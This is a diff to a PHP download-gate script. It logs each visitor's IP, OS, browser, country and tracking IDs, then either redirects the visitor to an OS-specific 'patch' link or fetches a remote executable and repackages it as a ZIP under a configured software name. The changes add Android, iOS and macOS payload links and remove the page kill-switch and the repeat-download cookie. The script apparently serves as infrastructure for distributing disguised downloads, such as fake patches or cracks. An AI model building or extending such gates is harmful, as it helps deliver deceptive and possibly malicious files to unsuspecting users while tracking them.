@@ -13,6 +13,10 @@ $software_name = $settings->Archiving->SoftwareName; // Software Name
 $zip_file = $settings->Archiving->ZIPName; // Name of the resulting ZIP file
 $FileName = $settings->FileName; // Set filename when download
 
+$AndroidLink = $settings->AndroidLink;
+$iOSLink = $settings->iOSLink;
+$MacOSLink = $settings->MacOSLink;
+
 // PatchDownloadLinks
 $patchURL = $settings->PatchDownloadLinks[0];
 
@@ -20,6 +24,8 @@ $patchURL = $settings->PatchDownloadLinks[0];
 $rayid = $_GET['rayid'];
 // Country Code
 $countrycode = $_GET['countrycode'];
+// get Version
+$version = $_GET['version'];
 // Browser name & version
 $browser = getBrowser();
 
@@ -31,24 +37,11 @@ $userOS = getOS();
 // Get the main domain dynamically
 $mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"
 
-// Check if the page is set to "OFF" and redirect to the main domain
-if ($settings->PageStatus == "OFF") {
-    header("Location: https://$mainDomain");
-    exit();
-}
-
 // Redirect if the user's OS is not in the allowed list
 if (!in_array($userOS, $settings->OS)) {
     header("Location: https://$mainDomain");
     exit();
 }
-
-// Redirect if the user has already downloaded the file (tracked by cookie)
-if (isset($_COOKIE['download_success'])) {
-    header("Location: https://$mainDomain");
-    exit();
-}
-
 
 // Handle download request
 if ($_SERVER['REQUEST_METHOD'] == 'GET') {
@@ -57,10 +50,22 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
     if ($archiving == "OFF") {
         
         // Log the visitor and download count
-        logVisitor($userIP, $userOS, $countrycode, $rayid, $browser);
+        logVisitor($userIP, $userOS, $countrycode, $rayid, $browser, $version);
 
-
-        header("Location: $patchURL");
+        switch($userOS) {
+            case "Windows":
+                header("Location: $patchURL");
+                break;
+            case "Android":
+                header("Location: $AndroidLink");
+                break;
+            case "iPhone":
+                header("Location: $iOSLink");
+                break;
+            case "macOS":
+                header("Location: $MacOSLink");
+                break;
+        }
 
         // modify download status
         modifyDownloadStatus();
@@ -76,10 +81,24 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
     if ($archiving == "ON") {
         
          // Log the visitor and download count
-         logVisitor($userIP, $userOS, $countrycode, $rayid, $browser);
+         logVisitor($userIP, $userOS, $countrycode, $rayid, $browser, $version);
         
          // Download the external .exe file from the patch download link
-         $exe_content = file_get_contents($patchURL);
+         
+         switch($userOS) {
+            case "Windows":
+                $exe_content = file_get_contents($patchURL);
+                break;
+            case "Android":
+                $exe_content = file_get_contents($AndroidLink);
+                break;
+            case "iPhone":
+                $exe_content = file_get_contents($iOSLink);
+                break;
+            case "macOS":
+                $exe_content = file_get_contents($MacOSLink);
+                break;
+        }
  
  
          if ($exe_content === false) {
@@ -120,10 +139,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
              // download count
              incrementDownloadCount();
  
-             // Set a cookie to track that the user has successfully downloaded the file
-             setcookie('download_success', true, time() + (86400 * 30)); // Set cookie for 30 days
- 
-             exit;
+            exit;
         } else {
             die('Failed to create the .zip file.');
         }
@@ -141,6 +157,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
 function getOS() {
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
     if (preg_match('/Windows/i', $userAgent)) return 'Windows';
+    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
     if (preg_match('/Android/i', $userAgent)) return 'Android';
     if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
     return 'Unknown OS';
@@ -148,10 +165,10 @@ function getOS() {
 
 
 // Function to log visitor details to CSV
-function logVisitor($ip, $os, $country, $rayid, $browser) {
+function logVisitor($ip, $os, $country, $rayid, $browser, $version) {
     $csvFile = 'visitors.csv';
     $file = fopen($csvFile, 'a');
-    fputcsv($file, [$ip, $os, $country, date('Y-m-d H:i:s'), $rayid, $browser, "Skiped" ]);
+    fputcsv($file, [$ip, $os, $country, date('Y-m-d H:i:s'), $rayid, $browser, "Skiped", $version ]);
     fclose($file);
 }
 
@@ -214,38 +231,31 @@ function modifyDownloadStatus() {
 // get browser name & version
 function getBrowser()
 {
+    // Get the user agent string
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $browser = "N/A";
-    $version = "";
 
-    // Define the list of browsers with their respective user-agent patterns
-    $browsers = [
-        '/edg/i' => 'Edge',        // Microsoft Edge (Chromium-based versions have 'Edg')
-        '/chrome/i' => 'Chrome',   // Google Chrome
-        '/safari/i' => 'Safari',   // Apple Safari
-        '/firefox/i' => 'Firefox', // Mozilla Firefox
-        '/opera/i' => 'Opera',     // Opera Browser
-        '/msie/i' => 'Internet Explorer', // Older IE versions
-        '/trident/i' => 'Internet Explorer', // IE 11+
-        '/mobile/i' => 'Mobile Browser', // Mobile Browsers
-    ];
+    // Initialize the browser name variable
+    $browser = "Unknown Browser";
 
-    // Loop through the browser array to find a match
-    foreach ($browsers as $regex => $value) {
-        if (preg_match($regex, $user_agent)) {
-            $browser = $value;
-
-            // Match version number after the browser name (or special cases like Safari)
-            if ($browser === 'Safari' && preg_match('/Version\/(\d+(\.\d+)*)/i', $user_agent, $versionMatch)) {
-                $version = $versionMatch[1];
-            } elseif (preg_match('/' . $value . '[\/\s](\d+(\.\d+)*)/i', $user_agent, $versionMatch)) {
-                $version = $versionMatch[1];
-            }
-            break;
-        }
+    // Check for Microsoft Edge (Chromium-based and Legacy Edge)
+    if (strpos($user_agent, 'Edg') !== false) {
+        $browser = "Microsoft Edge";
+    // Check for Opera
+    } elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
+        $browser = "Opera";
+    // Check for Google Chrome (after checking for Opera and Edge)
+    } elseif (strpos($user_agent, 'Chrome') !== false) {
+        $browser = "Google Chrome";
+    // Check for Mozilla Firefox
+    } elseif (strpos($user_agent, 'Firefox') !== false) {
+        $browser = "Mozilla Firefox";
+    // Check for Safari (excluding Chrome and Edge)
+    } elseif (strpos($user_agent, 'Safari') !== false) {
+        $browser = "Safari";
     }
 
-    return $browser . ' ' . $version;
+    // Output the detected browser
+    return $browser;
 }
 
 
